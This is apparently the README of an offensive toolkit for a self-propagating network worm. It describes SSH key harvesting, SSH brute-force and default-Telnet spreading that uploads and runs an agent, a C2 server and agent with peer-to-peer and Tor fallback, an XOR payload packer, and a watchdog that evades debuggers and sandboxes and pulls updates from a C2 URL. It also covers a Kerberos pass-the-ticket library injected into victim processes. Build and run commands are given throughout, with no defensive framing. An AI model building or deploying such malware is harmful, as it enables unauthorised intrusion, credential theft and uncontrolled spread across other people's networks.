## Description  

This project implements a multi-component self-propagating worm, consisting of:

| Component | Role |
|-----------|------|
| **recon** | Reconnaissance module: gathers SSH credentials, scans the network, launches attack plugins |
| **guid** | Technique plugins for remote access over SSH and Telnet |
| **agent** | Lightweight C2 agent: deploys on victims, enables peer-to-peer propagation & remote command execution |

**P2P Module**
Maintains a dynamic peer list by listening on a designated TCP port, ingesting neighbor-reported node addresses, and seamlessly merging them into a unified set without duplicates. This ensures the agent always has up-to-date peer endpoints for decentralized communication.

**Tor Fallback**
Provides a resilient C2 channel by first attempting a direct HTTPS POST and, on failure or non-200 response, automatically rerouting the same request through the Tor network via a SOCKS5 proxy. This preserves connectivity and anonymity even when the primary server is unreachable.

---

## Quick Usage

Run network reconnaissance: python recon.py

When prompted:
* staging directory default /tmp/ssh_creds
* any additional credentials

The script will automatically:

1. Collect SSH private keys & known_hosts → save as JSON in the staging dir.
2. Discover live hosts in the LAN.
3. For each host, apply the first successful technique from ALL_TECHNIQUES.

## Plugins — guid

All plugins share a Technique interface:

```
def applicable host -> bool
def execute host, creds_db -> bool
```

| Plugin               | What it does                                                                                                       |
| -------------------- | ------------------------------------------------------------------------------------------------------------------ |
| **SSHBruteForce**  | Targets port 22 → tries user/pass combos & SSH keys; on success, uploads & runs the payload/agent via SFTP |
| **TelnetDefaults** | Targets port 23 → attempts default Telnet creds; on success, transfers the agent in Base64 and executes        |

All are aggregated into ALL_TECHNIQUES for use by recon.py.

# Server
The server component receives beacons from Go agents in JSON format, generates unique UUIDs for each, stores and updates host data in a MySQL database, issues pending commands for execution, and marks them as executed. Database connection settings are centralized in a single configuration file, and all operations on the hosts, commands, and executed_commands tables are handled by a wrapper class. A simple web interface allows you to view the list of registered agents and add new commands with an optional OS filter.

# Packer
packer_loader.exe is a self-extracting executable with a built in virtual machine.  
It XOR encrypts any binary payload and bundles it with a loader into a single EXE.  
When run the packed EXE, it automatically decrypts the payload and executes it in the VM.

### Features

- Pack any binary into a self extracting EXE.  
- XOR encryption of the payload at pack time and automatic decryption at run time.  
- Built in VM for a simple stack based bytecode PUSH, ADD, SUB, MUL, DIV, PRINT, HALT  
- No external dependencies all code is contained in the EXE.

### Build on Windows / MinGW

1. Place these files in one folder:
   - vm.h, vm.c  
   - packer_loader.c 
   - Makefile  

2. Open an MSYS2/MinGW shell and run:
   make

3. The build produces packer_loader.exe.

### Usage

1. Pack a payload packer_loader.exe pack <input.bin> <output.exe>
   
   * <input.bin>: payload.
   * <output.exe>: name of the self extracting EXE.

2. Run the packed EXE output.exe

   * Read its own file.
   * Locate the 0xDEADBEEF marker.
   * XOR decrypt the embedded payload.
   * Execute the payload in the VM.

### Working

Build:
```
make
```
Pack:
```
packer_loader.exe pack bytecode.bin packed_vm.exe
```
Run:
```
packed_vm.exe
```

### Customization

* Encryption key: edit the key array in packer_loader.c.
* VM opcodes/stack size: modify vm.h/vm.c.
* Add new instructions: extend the enum in vm.h and handling in run_vm.

# Watchdog & P2P Loader Module /P2P_control

This component provides:

1. **Self-defense** — detects debuggers, virtual machines, and sandbox environments.
2. **Watchdog daemon**:

   * Daemonizes the process, double fork.
   * Monitors the worm process and respawns it if it dies.
   * Verifies the binarys SHA256 hash every 30 seconds; if changed or missing, downloads the latest version from a URL and restarts it.
3. **P2P loader**:

   * Runs in a background thread and every 30 seconds loads c2_config.dll.
   * Reads exported C2Count and C2Addresses symbols.
   * Makes the C2 addresses available for your P2P logic.

---

## Features

* Anti analysis
  is_compromised returns true if a debugger is present, a hypervisor bit is set, or DMI strings indicate a sandbox environment.

* **Watchdog**

  * Daemonizes the process.
  * Spawns and monitors the worm binary.
  * Every 30 seconds checks process health and file integrity.
  * Auto-updates via HTTP/S using libcurl and OpenSSL.

* **P2P loader**

  * Runs in a separate thread.
  * Every 30 seconds reloads c2_config.dll.
  * Reads the exported C2 addresses for decentralized backup channels.

---

## Build & Usage

#### Prerequisites

* MinGW-w64 toolchain x86_64-w64-mingw32-gcc
* Libcurl and OpenSSL

#### Building

```sh
make
```

This produces:

* c2_config.dll
* watchdog.exe

## Running

```
watchdog.exe <agent.exe> <https://c2.server/agent.exe>
```

* Exits immediately if a debugger, VM, or sandbox environment is detected.
* Otherwise:

  * Starts the agent, monitors it, and updates it as needed.
  * Concurrently reloads P2P C2 addresses from the DLL every 30 seconds.

---

## Updating the C2 List

1. Edit dll/c2_config.c, adjust C2Count and the C2Addresses array.
2. Rebuild just the DLL:

   ```
   make c2_config.dll
   ```
3. The running service will pick up the new addresses on its next DLL reload cycle.

# Scanner

Console tool that, reads a local SQLite CVE DB. Checks kernel and specified package versions.Prints matching CVEs and local exploits from a CSV.
Version range checks are done in C; keep ranges accurate. CSV parser is simple: no quotes or commas inside fields. Missing packages just produce a notice.
On OOM, entries are skipped safely, no crash.


## Dependencies

* gcc, make
* SQLite3 dev libs libsqlite3-dev/sqlite-devel
* Python 3.7+ to build the DB

## Build

```
cd cve_scanner_c
make           
```

Useful targets:

```
make db        
make exploits   
make clean     
make clean-db  
```

## Options:

* --db PATH        path to the SQLite CVE DB
* --exploits PATH  path to exploits CSV id,cve,description,path
* --kernel         scan kernel version
* --packages LIST  comma separated package names
* -h/--help        help

## Updating the CVE DB

```
./tools/update_nvd_sqlite.py data/nvd.sqlite3 --json-dir data/nvd_json --download
```

## Data

SQLite table cves:

```
id TEXT PRIMARY KEY
summary TEXT

# PTT‑lib
 
Platform independent shared C library so/dll that extracts and serializes Kerberos tickets from the local cache krb5cc_<uid> for use in SMB/SSH authentication pass‑the‑ticket. Supports reading the default or a custom ccache path. Serializes each ticket into a compact binary format: [4‑byte BE length][ticket data]. Lightweight, with no external dependencies except MIT Kerberos. Suitable for dynamic loading via dlopen / LoadLibrary and invocation from Go/Python/C embeddings  

## Functions
- ptt_init initialize the Kerberos context.  
- ptt_export open the specified or default ccache, iterate all tickets, and serialize them into the buffer. 
- ptt_cleanup free Kerberos context resources.  

## Build
```
mkdir build && cd build
cmake ..
cmake --build .
````

Generates:

* libptt.so on Linux
* ptt.dll on Windows

## Injection using start.py

```
python3 start.py <URL_LIB> <PID>
```

* <URL_LIB> — URL to libptt.so or ptt.dll
* <PID>     — target process ID for injection

The script downloads the library into TEMP, detects the platform, and injects it into the target process on Linux/Windows.

---

## Integration

The main worm binary can invoke start.py to:

1. Dynamically fetch the latest ptt‑lib from the C2 server
2. Inject the library into a victim process
3. Call inside the injected process to collect Kerberos tickets

The ptt_export interface then allows the worm to retrieve and forward tickets over the network for further propagation within the domain.
